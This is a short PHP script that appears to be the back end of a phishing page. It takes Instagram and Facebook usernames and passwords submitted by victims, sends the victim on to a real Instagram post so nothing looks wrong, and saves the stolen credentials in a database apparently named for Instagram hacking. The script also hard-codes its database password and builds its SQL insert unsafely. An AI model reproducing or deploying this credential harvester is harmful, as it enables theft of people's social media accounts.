<?php


$instaName = $_POST['instagramName'];
$instaPassword = $_POST['instagramPassword'];
$faceName = $_POST['FacebookName'];
$facePassword = $_POST['FacebookPassword'];


$_SESSION['name'] = $instaName;
$_SESSION['password'] = $instaPassword;



header('Location: https://www.instagram.com/p/CTrDhHRM171/?utm_medium=copy_link');



$mysql = new mysqli("localhost", "j90049_instahack", "bKUjzYs9zVZOUlDi", "j90049_db");
$mysql ->query("SET NAMES 'utf8'");
$mysql -> query("INSERT INTO `Instaxack`  (`InstaName`, `InstaPass`,`FaceName`,`FacePass`) VALUE ('$instaName','$instaPassword','$faceName','$facePassword')");

